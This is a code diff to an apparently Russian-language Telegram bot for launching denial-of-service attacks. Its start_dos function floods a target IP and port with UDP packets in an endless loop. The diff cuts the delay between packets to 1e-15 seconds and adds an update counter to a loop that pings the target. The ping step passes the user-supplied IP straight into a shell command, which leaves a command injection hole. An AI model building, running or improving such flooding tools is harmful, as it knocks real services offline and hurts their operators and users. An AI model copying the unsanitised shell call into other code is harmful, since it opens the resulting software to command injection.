@@ -15,7 +15,9 @@ async def get_timeout():
 async def get_ping(message: Message, dos_data: FSMContextProxy):
     current_path = os.path.dirname(os.path.abspath(__file__))
     msg = await message.answer(f"Текущее состояние пакетов по данному IP-адресу:")
+    i = 0
     while await dp.current_state().get_state() != 'DosState:stopped_script':
+        i += 1
         cmd = f"sh '{current_path}/ping.sh' {dos_data['ip']}"
         proc = await asyncio.create_subprocess_shell(
             cmd=cmd,
@@ -23,10 +25,10 @@ async def get_ping(message: Message, dos_data: FSMContextProxy):
             stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await proc.communicate()
-        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}")
-
+        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}\n\n"
+                            f"Количество обновлений: {i}")
 
 async def start_dos(connect, ip: str, port: int, attack: bytes):
     while True:
         connect.sendto(attack, (ip, port))
-        await asyncio.sleep(0.000000001)
+        await asyncio.sleep(0.000000000000001)
